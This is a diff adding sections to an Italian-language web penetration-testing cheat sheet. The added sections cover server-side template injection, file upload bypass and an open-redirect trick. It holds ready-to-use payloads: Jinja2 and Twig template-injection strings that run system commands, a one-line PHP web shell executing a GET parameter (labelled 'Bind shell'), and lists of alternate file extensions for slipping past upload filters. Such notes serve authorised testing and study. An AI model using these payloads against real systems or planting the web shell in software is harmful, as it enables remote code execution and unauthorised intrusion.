@@ -254,3 +254,38 @@ Quando un redirect è forzato a iniziare con `/`, l'aggiunta del sito web al red
 
 http://<dominio corretto e sotto whitelist>.<dominio ad-hoc che risponde 127.0.0.1 per ogni sotto dominio>
 ```
+
+# SSTI
+[Server-Side Template Injection - @albinowax](https://portswigger.net/research/server-side-template-injection)
+
+**Jinja2**
+```
+{{7*7}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+
+**Twig**
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+# File upload
+
+**Bind shell**
+
+```php
+<?php
+	system($_GET["c"]);
+?>
+```
+
+**Lista di estensioni**
+
+- **PHP**: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+    - **Working in PHPv8**: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
+- **ASP**: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+- **Jsp**: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+- **Coldfusion**: .cfm, .cfml, .cfc, .dbm
+- **Flash**: .swf
+- **Perl**: .pl, .cgi
+- **Erlang Yaws Web Server**: .yaws
